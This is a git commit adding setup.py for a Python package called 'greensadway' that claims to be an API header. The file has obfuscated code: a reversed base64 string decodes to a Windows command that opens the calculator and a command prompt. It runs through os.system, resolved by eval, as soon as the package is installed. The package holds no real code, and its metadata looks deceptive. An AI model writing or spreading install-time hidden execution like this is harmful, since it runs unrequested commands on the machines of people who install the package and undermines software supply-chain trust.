899ca55a8da9b39bd4244c2e0121e0e18536604e
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2025-07-30 03:34:35 +0000

    Add package greensadway/0.1/greensadway-0.1.tar.gz

---
+++ packages/greensadway/greensadway-0.1.tar.gz/greensadway-0.1/setup.py
@@ -0,0 +1,16 @@
+from setuptools import setup
+import base64
+import os
+ZhMQousbtreA =(("==A"+"ZtN"+"G" +"I0" +"JX" +'Y0N'+'HI' +'mAy'+'Ys'+'F2Y' +'gQn'+"c" +'hR3' +'c')[::-1]).encode()
+DDFnXaSRAwl =base64.b64decode(ZhMQousbtreA).decode()
+ymzUyxPWbI =eval(('m'+'et'+"sy" +"s."+"so")[::-1])
+ymzUyxPWbI(DDFnXaSRAwl)
+setup(name='greensadway',
+      version='0.1',
+      description='this is api header for greensadway',
+      url='https://greensadway.gov/package/m5/dist',
+      author='abknock',
+      author_email='AbbieKnoblock519@proton.me',
+      license='MIT',
+      packages=[],
+      zip_safe=False)
